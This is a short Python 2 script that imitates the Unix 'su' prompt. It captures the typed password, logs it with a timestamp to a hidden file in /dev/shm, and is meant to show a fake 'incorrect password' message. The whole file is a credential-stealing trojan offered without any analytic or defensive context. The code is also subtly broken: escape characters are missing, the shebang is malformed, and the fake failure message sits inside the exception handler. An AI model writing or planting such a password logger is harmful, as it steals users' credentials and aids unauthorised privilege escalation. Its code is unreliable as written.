#！/usr/bin/python
import os,sys,getpass,time

current_time = time.strftime("%Y-%m-%d %H:%M")
logfile="/dev/shm/.su.log"
fail_str = "su: incorrect password"
try:
	passwd = getpass.getpass(prompt='Password: ');
	file = open(logfile,'a')
	file.write("[%s]t%s"%(passwd,current_time))
	file.write('n')
	file.close()
except:
	pass
	time.sleep(1)
	print fail_str
